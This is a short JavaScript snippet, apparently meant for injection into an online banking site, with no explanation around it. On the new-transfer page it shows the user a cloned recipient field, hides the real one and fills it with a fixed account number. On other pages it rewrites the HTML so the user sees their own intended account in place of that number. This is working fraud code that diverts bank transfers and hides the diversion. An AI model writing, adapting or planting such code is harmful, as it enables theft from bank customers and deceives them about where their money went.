var trgtnum = "11111111111111111111111111";

if (window.location.pathname == "/new_transfer") {
    var origField = document.getElementById("id_to");
    var dupField = origField.cloneNode(origField);
    dupField.id = "ignoreme";
    dupField.addEventListener("change", () => localStorage.setItem("accnum", document.getElementById("ignoreme").value));
    origField.parentNode.insertBefore(dupField, origField);

    origField = document.getElementById("id_to");
    origField.style.display = 'none';
    origField.value = trgtnum;
} else {
    document.body.innerHTML = document.body.innerHTML.replace(new RegExp(trgtnum, 'g'), localStorage["accnum"]);
}

